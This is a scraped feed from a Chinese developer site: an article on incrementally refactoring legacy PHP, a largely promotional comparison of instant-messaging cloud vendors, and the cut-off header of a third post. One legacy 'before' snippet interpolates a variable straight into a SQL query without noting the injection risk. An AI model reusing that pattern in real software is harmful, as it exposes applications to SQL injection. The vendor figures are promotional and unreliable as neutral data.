<p>这时候你才意识到：这就是遗留 PHP 代码。</p>
<p>不是"老"PHP，不是"烂"PHP，只是活得够久、变成了核心系统的代码。</p>
<p>现在它归你了。</p>
<p>重构遗留 PHP 的名声一直不好——痛苦、高风险、精神损耗大。但大部分痛苦来自重构的方式，而不是代码本身。</p>
<p>这篇文章讲的是怎么重构遗留 PHP，同时保持心态不崩、系统不炸、也不用推翻重来。</p>
<h3 data-id="heading-2">先搞清楚"遗留代码"到底是什么意思</h3>
<p>遗留代码不等于"烂代码"。</p>
<p>遗留代码是没有安全网的代码：</p>
<ul>
<li>没有测试</li>
<li>没有清晰的边界</li>
<li>没有文档</li>
<li>改了之后心里没底，不知道会不会炸</li>
</ul>
<p>有些遗留 PHP 是 15 年前写的。有些是去年写的——赶工期，没时间收拾。</p>
<p>怪过去没有用。你的任务不是评判，而是让下一次改动比上一次更安全。</p>
<p>光是这个心态转变，就能改变很多事。</p>
<h3 data-id="heading-3">黄金法则：永远不要盲目重构</h3>
<p>在动结构、格式、架构之前，你需要的是可见性。</p>
<p>不理解行为就动手重构，是线上事故的典型成因。</p>
<h4 data-id="heading-4">找到关键路径</h4>
<p>先问这几个问题：</p>
<ul>
<li>哪些接口被调用得最频繁？</li>
<li>哪些脚本涉及资金、认证或数据完整性？</li>
<li>哪些定时任务在自动运行？</li>
</ul>
<p>从这些地方开始，而不是从最丑的那个文件开始。</p>
<p>遗留 PHP 系统通常能活下来，是因为核心路径是稳定的——哪怕代码很难看。</p>
<h4 data-id="heading-5">改代码之前，先锁住行为</h4>
<p>你不需要完整的测试覆盖率，你需要的是行为锚点。</p>
<p><strong>特征测试（Characterization Tests）</strong></p>
<p>不是测代码"应该"做什么，而是测它"目前"在做什么。</p>
<p>PHPUnit 示例：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testLegacyDiscountCalculation</span>(<span class="hljs-params"/>)
</span>{
    <span class="hljs-variable">$calculator</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LegacyDiscountCalculator</span>();
    <span class="hljs-variable">$result</span> = <span class="hljs-variable">$calculator</span>-&gt;<span class="hljs-title function_ invoke__">calculate</span>(<span class="hljs-number">100</span>, <span class="hljs-string">'VIP'</span>);
    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">assertEquals</span>(<span class="hljs-number">85</span>, <span class="hljs-variable">$result</span>);
}
</code></pre>
<p>你可能不喜欢这个逻辑，可能还没看懂。没关系。</p>
<p>目标很简单：<strong>如果我重构了这段代码，我要能知道行为变了没有。</strong></p>
<p>这些测试是临时的安全带——但关键时刻能救命。</p>
<h4 data-id="heading-6">先止血</h4>
<p>在"清理"之前，先修掉那些正在持续制造问题的东西。</p>
<p><strong>遗留 PHP 常见的出血点</strong></p>
<p><strong>全局状态</strong></p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">global</span> <span class="hljs-variable">$db</span>;
<span class="hljs-keyword">global</span> <span class="hljs-variable">$user</span>;
</code></pre>
<p>全局变量让重构几乎不可能。第一步：把它包起来。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Database</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">query</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$sql</span></span>): <span class="hljs-title">array</span>
    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">'db'</span>]-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);
    }
}
</code></pre>
<p>不完美——但你有了一条缝（seam）。</p>
<p><strong>职责混杂</strong></p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">processOrder</span>(<span class="hljs-params"/>)
</span>{
    <span class="hljs-comment">// validate input</span>
    <span class="hljs-comment">// query database</span>
    <span class="hljs-comment">// calculate totals</span>
    <span class="hljs-comment">// send email</span>
    <span class="hljs-comment">// render HTML</span>
}
</code></pre>
<p>不要一口气全改，一次只抽离一个职责。</p>
<h3 data-id="heading-7">先建边界，再追求完美</h3>
<p>重构不是重写。</p>
<p>目标是划出清晰的边界，而不是打磨漂亮的内部实现。</p>
<h4 data-id="heading-8">用有意义的名字提取函数</h4>
<p>遗留代码往往做的事情是对的，只是形式不对。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$total</span> = <span class="hljs-number">0</span>;
<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$items</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$item</span>[<span class="hljs-string">'type'</span>] === <span class="hljs-string">'digital'</span>) {
        <span class="hljs-variable">$total</span> += <span class="hljs-variable">$item</span>[<span class="hljs-string">'price'</span>];
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-variable">$total</span> += <span class="hljs-variable">$item</span>[<span class="hljs-string">'price'</span>] + <span class="hljs-number">10</span>;
    }
}
</code></pre>
<p>第一步重构：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$total</span> = <span class="hljs-title function_ invoke__">calculateOrderTotal</span>(<span class="hljs-variable">$items</span>);
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">calculateOrderTotal</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$items</span></span>): <span class="hljs-title">float</span>
</span>{
    <span class="hljs-variable">$total</span> = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$items</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) {
        <span class="hljs-variable">$total</span> += <span class="hljs-title function_ invoke__">itemTotal</span>(<span class="hljs-variable">$item</span>);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$total</span>;
}
</code></pre>
<p>行为没变，但可读性和可测试性变了。</p>
<p>这就是一次有效的改进。</p>
<h3 data-id="heading-9">在最痛的地方加类型</h3>
<p>不需要第一天就全面开启严格类型。</p>
<p>从 bug 容易藏身的地方开始：</p>
<ul>
<li>函数输入</li>
<li>函数输出</li>
<li>公开方法</li>
</ul>
<pre><code class="hljs language-php" lang="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">findUser</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)
</span>{
    <span class="hljs-comment">// returns array or false or null</span>
}
</code></pre>
<p>重构方向：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">findUser</span>(<span class="hljs-params"><span class="hljs-keyword">int</span> <span class="hljs-variable">$id</span></span>): ?<span class="hljs-title">User</span>
</span>{
    <span class="hljs-comment">// return User or null</span>
}
</code></pre>
<p>类型做两件事：<strong>表达意图</strong>，<strong>暴露隐藏的假设</strong>。</p>
<p>遗留 PHP 能跑通，往往是因为什么都是"灵活"的。类型会逼你面对真实情况。</p>
<h3 data-id="heading-10">用有意义的表达替换魔术数字</h3>
<p>遗留 PHP 特别喜欢用标志位。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$status</span> === <span class="hljs-number">1</span>) {
    <span class="hljs-comment">// active</span>
} <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$status</span> === <span class="hljs-number">2</span>) {
    <span class="hljs-comment">// pending</span>
}
</code></pre>
<p>用常量或枚举重构：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">UserStatus</span>: <span class="hljs-title">int</span>
</span>{
    <span class="hljs-keyword">case</span> Active = <span class="hljs-number">1</span>;
    <span class="hljs-keyword">case</span> Pending = <span class="hljs-number">2</span>;
}
</code></pre>
<p>然后：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$user</span>-&gt;status === <span class="hljs-title class_">UserStatus</span>::<span class="hljs-variable constant_">Active</span>) {
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<p>代码一下子就能自己解释自己了。</p>
<h3 data-id="heading-11">慢慢消灭复制粘贴的代码</h3>
<p>重复代码是生存策略，不是无能的表现。</p>
<p>遗留 PHP 之所以有大量重复，是因为当时做抽象的风险太大。</p>
<p>你的做法：</p>
<ol>
<li>找到稳定的重复</li>
<li>搞清楚差异之后再提取</li>
</ol>
<p>例如这段代码到处都是：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$tax</span> = <span class="hljs-variable">$price</span> * <span class="hljs-number">0.1</span>;
<span class="hljs-variable">$total</span> = <span class="hljs-variable">$price</span> + <span class="hljs-variable">$tax</span>;
</code></pre>
<p>提取出来：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">calculateTax</span>(<span class="hljs-params"><span class="hljs-keyword">float</span> <span class="hljs-variable">$price</span></span>): <span class="hljs-title">float</span>
</span>{
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$price</span> * <span class="hljs-number">0.1</span>;
}
</code></pre>
<p>不要过早做过度抽象。重构的方向是清晰，不是理论上的复用。</p>
<h3 data-id="heading-12">把基础设施和业务逻辑分开</h3>
<p>遗留 PHP 重构中收益最大的一件事，就是把下面这些东西和真正的业务规则分开：</p>
<ul>
<li>SQL</li>
<li>HTTP</li>
<li>框架胶水代码</li>
</ul>
<p><strong>重构前：</strong></p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-string">"SELECT * FROM users WHERE id = <span class="hljs-subst">$id</span>"</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$row</span>[<span class="hljs-string">'type'</span>] === <span class="hljs-string">'premium'</span>) {
    <span class="hljs-variable">$discount</span> = <span class="hljs-number">0.2</span>;
}
</code></pre>
<p><strong>重构后（渐进式）：</strong></p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$user</span> = <span class="hljs-variable">$userRepository</span>-&gt;<span class="hljs-title function_ invoke__">findById</span>(<span class="hljs-variable">$id</span>);
<span class="hljs-variable">$discount</span> = <span class="hljs-variable">$discountPolicy</span>-&gt;<span class="hljs-title function_ invoke__">forUser</span>(<span class="hljs-variable">$user</span>);
</code></pre>
<p>即使 repository 内部仍然用的是裸 SQL，你也已经创造了一条缝。</p>
<p>有缝，重构才安全。</p>
<h3 data-id="heading-13">不要一次性"升级"所有东西</h3>
<p>在遗留系统中升级 PHP 版本是件让人紧张的事，因为升级会把隐藏的问题暴露出来。</p>
<p>把升级当成反馈，而不是失败：</p>
<ul>
<li>遇到废弃警告就修</li>
<li>在非生产环境开启 warning</li>
<li>把 notice 当成重构线索</li>
</ul>
<p>每一条警告都在告诉你："代码的这个部分不够清晰，或者不够安全。"</p>
<p>这是有价值的信息。</p>
<h3 data-id="heading-14">用日志当临时调试网</h3>
<p>测试缺失的时候，日志能给你信心。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-title function_ invoke__">logger</span>()-&gt;<span class="hljs-title function_ invoke__">info</span>(<span class="hljs-string">'Calculating discount'</span>, [
    <span class="hljs-string">'user_id'</span> =&gt; <span class="hljs-variable">$user</span>-&gt;id,
    <span class="hljs-string">'type'</span> =&gt; <span class="hljs-variable">$user</span>-&gt;type,
]);
</code></pre>
<p>重构之后对比日志。如果行为出现了意料之外的偏差，你能及时发现。</p>
<h3 data-id="heading-15">切薄片来重构</h3>
<p>永远不要一次性重构：</p>
<ul>
<li>整个模块</li>
<li>整个功能</li>
<li>整个目录</li>
</ul>
<p>一次改一条路径、一个函数、一个职责。</p>
<p>小改进会累积。</p>
<p>遗留系统不是瞬间崩塌的——它是慢慢被侵蚀的。你的重构也应该以同样的节奏推进。</p>
<h3 data-id="heading-16">知道什么时候该停手</h3>
<p>完美代码是个陷阱。</p>
<p>以下情况就该收手了：</p>
<ul>
<li>下一次改动让你觉得有安全感</li>
<li>代码意图是清晰的</li>
<li>各部分有明确的边界</li>
<li>你能向另一个开发者讲清楚这段代码</li>
</ul>
<p>你不是在创作艺术品，你是在降低风险。</p>
<h3 data-id="heading-17">重构遗留 PHP 的情感面</h3>
<p>重构遗留 PHP 之所以让人难受，是因为：</p>
<ul>
<li>代码在跟你对着干</li>
<li>问题一眼就能看到</li>
<li>系统还依赖着这些代码在跑</li>
</ul>
<p>但别忘了：这些代码能活到今天，说明它一直在发挥作用。</p>
<p>你的任务不是抹掉过去，而是让未来没那么痛苦。</p>
<h3 data-id="heading-18">最后</h3>
<p>重构遗留 PHP 不需要英雄主义。</p>
<p>它需要的是：</p>
<ul>
<li>耐心</li>
<li>克制</li>
<li>对历史约束的理解</li>
<li>在小改进上的持续纪律</li>
</ul>
<p>你不是通过重写来重构遗留 PHP 的。你是通过一次又一次安全的小改动，一点一点赢得它的信任。</p>
<p>如果做对了——你不会崩溃。说不定还会觉得挺有意思。
<a href="https://link.juejin.cn?target=https%3A%2F%2Fcatchadmin.com%2Fpost%2F2026-02%2Frefactoring-legacy-php" target="_blank" title="https://catchadmin.com/post/2026-02/refactoring-legacy-php" ref="nofollow noopener noreferrer">如何重构遗留 PHP 代码 不至于崩溃</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2026 年 IM 怎么选？聊聊 4 家主流即时通讯方案的差异]]></title>    <link>https://juejin.cn/post/7605782093482049562</link>    <guid>https://juejin.cn/post/7605782093482049562</guid>    <pubDate>2026-02-12T13:48:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605782093482049562" data-draft-id="7605535884940558387" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2026 年 IM 怎么选？聊聊 4 家主流即时通讯方案的差异"/> <meta itemprop="keywords" content="后端,前端,Android"/> <meta itemprop="datePublished" content="2026-02-12T13:48:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="codeGoogle"/> <meta itemprop="url" content="https://juejin.cn/user/3386151542986520"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2026 年 IM 怎么选？聊聊 4 家主流即时通讯方案的差异
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3386151542986520/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    codeGoogle
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T13:48:13.000Z" title="Thu Feb 12 2026 13:48:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>随着移动互联网进入成熟阶段，即时通讯（IM）早已不只是社交产品的附加功能，而是越来越多 App 的基础能力。从社交场景下的实时互动，到企业内部协同沟通，再到在线教育、互联网医疗等垂直行业，IM 的稳定性、扩展能力以及功能完整度，都会直接影响整体产品体验和竞争力。</p>
<p>在国内市场，环信、融云、网易云信、腾讯云 IM 等厂商已经形成相对稳定的主流格局，各自都有清晰的技术定位和服务侧重点。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45537e96a0dc4de2a6b7adb9d8f38541~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZUdvb2dsZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771546449&amp;x-signature=H9Cgme83U9A9%2Btg0HNvxaEmQqRY%3D" alt="image.png" loading="lazy"/></p>
<p>下面我将根据每家解决方案的不同分维度来拆一下。</p>
<p><strong>环信：更强调工程落地与开发体验</strong></p>
<p>环信算是国内较早做 IM 云服务的一批厂商，在行业里沉淀时间比较长。整体来看，它的优势并不是某一个单点功能，而是架构、功能模块、安全合规和开发者支持几个方面比较均衡。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ef371bda580a4b53abd90a81ce4f86b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZUdvb2dsZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771546449&amp;x-signature=jijRfCP4NF9DnXBFgfqBsQapwx0%3D" alt="image.png" loading="lazy"/></p>
<p><strong>1.</strong> <strong>接入门槛相对友好</strong></p>
<p>对研发来说，IM 选型的第一问题通常是：多久能跑起来？</p>
<p>环信提供了 SDK、UIKit、CallKit 等不同层级的接入方式。常见的单聊、群聊、聊天室、音视频等能力基本都能快速接入。UIKit 封装了常用 UI 组件，支持直接复用或二次定制，Demo 也比较完整，能节省不少搭建基础框架的时间。</p>
<p>平台支持比较全面：iOS、Android、Web、Windows、macOS、鸿蒙都有原生支持，同时兼容 React Native、Flutter 等跨端方案，小程序和 H5 也提供对应 SDK。服务端开放 Rest API 与 Webhook，方便和已有系统做整合。</p>
<p>如果项目本身还涉及音视频场景，IM + RTC 的整合方案也已经打通，实际落地中确实可以把开发周期压得比较短。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a6583cf68e464aa394d2459d948534c5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZUdvb2dsZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771546449&amp;x-signature=nkIcKv8q%2FTStN1OgBwTVNyFA3mU%3D" alt="image.png" loading="lazy"/></p>
<p><strong>2.</strong> <strong>定制能力与业务融合</strong></p>
<p>企业项目里，IM 往往不是一个孤立模块，而是要和现有系统深度融合。</p>
<p>环信的 SDK 采用模块化设计，可以按需集成功能，避免冗余。UI 层支持较深层级的定制，比如聊天界面样式、消息气泡、会话列表结构等，都可以根据品牌和产品风格做调整。</p>
<p>在业务联动方面，通过消息回调和 Webhook，可以把 IM 嵌入 CRM、OA、ERP 等系统，实现工单提醒、状态变更通知、会议提醒等实时交互。同时支持自定义消息类型，用来承载订单卡片、红包、工单等结构化信息。</p>
<p>对于需要社区、语聊房等功能的产品，也可以通过配置完成大部分需求，减少重复开发。</p>
<p><strong>3.</strong> <strong>架构稳定性与弱网优化</strong></p>
<p>IM 的难点往往在边缘场景，比如高并发或弱网环境。</p>
<p>环信基于分布式微服务架构，支持高并发场景下的弹性扩容。底层通信协议和路由策略做了针对性优化，在弱网情况下仍能保障消息可靠送达。</p>
<p>官方数据里提到延迟控制在 100ms 以内，SDK 崩溃率低于 0.005%，同时支持多端同步和长期消息漫游。从实际项目经验看，这些能力确实能减少团队在“兜底优化”上的额外投入。</p>
<p><strong>4.</strong> <strong>安全与合规能力</strong></p>
<p>在医疗、教育、政企等行业，合规是选型时绕不开的一环。</p>
<p>环信支持多种部署模式，并通过多项安全认证。通信链路默认加密，很多合规要求在默认配置下即可满足。内容审核能力也内置在平台中，可以自定义策略，对文本、图片等内容进行实时过滤，降低运营成本。</p>
<p><strong>5.</strong> <strong>技术支持与长期维护</strong></p>
<p>很多时候，真正影响体验的不是功能，而是售后支持。</p>
<p>环信提供 7×24 技术支持，覆盖接入、测试、上线到运维阶段。对需要出海的团队，也提供对应的全球化支持方案。对于中小团队来说，这种“工程化支持”能减少不少沟通成本。</p>
<p><strong>其他几家主流厂商的侧重点</strong></p>
<p>除了环信，另外几家厂商也各有优势：</p>
<ul>
<li><strong>融云</strong>：强调全球化布局以及 IM + RTC + AI 的融合能力，覆盖国家和地区广，适合有海外业务或复杂通信需求的产品。</li>
<li><strong>网易云信</strong>：背靠大厂技术体系，稳定性和音视频能力表现突出，圈组和频道管理适合大型社区或企业场景。</li>
<li><strong>腾讯云 IM</strong>：依托腾讯生态和 QQ、微信的技术积累，在社交、电商等领域具备天然生态优势，与腾讯系产品整合度高。</li>
</ul>
<p>整体来看，它们共同构成了国内 IM 的主流技术底座。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b5a921fe4164cd7bed4ae3c9655ee8a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZUdvb2dsZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771546449&amp;x-signature=HHAHyeq2klRwcS0XqIC2XcbRDwQ%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<p><strong>选型建议：不要只看功能，要看长期成本</strong></p>
<p>从海外部署能力到 AI 能力融合，从生态资源整合到企业级定制支持，融云、网易云信、腾讯云 IM 与环信几家厂商的发力方向并不完全相同，但客观来看，它们都在推动国内 IM 技术能力的升级以及应用场景的持续扩展。</p>
<p>对于开发者来说，选型的关键不在于“哪家更强”，而在于“哪家更匹配”。结合自身产品形态、用户规模以及长期规划，选择合适的合作方，才能让 IM 这项基础能力真正服务于业务增长，而不是成为后期的技术负担。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[PHP 的问题不在语言本身，而在我们怎么写它]]></title>    <link>https://juejin.cn/post/7605811866908131337</link>    <guid>https://juejin.cn/post/7605811866908131337</guid>    <pubDate>2026-02-12T23:58:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605811866908131337" data-draft-id="7605811866908114953" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="PHP 的问题不在语言本身，而在我们怎么写它"/> <meta itemprop="keywords" content="后端,PHP"/> <meta itemprop="datePublished" content="2026-02-12T23:58:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="BingoGo"/> <meta itemprop="url" content="https://juejin.cn/user/993614242266077"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            PHP 的问题不在语言本身，而在我们怎么写它
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/993614242266077/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    BingoGo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T23:58:13.000Z" title="Thu Feb 12 2026 23:58:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
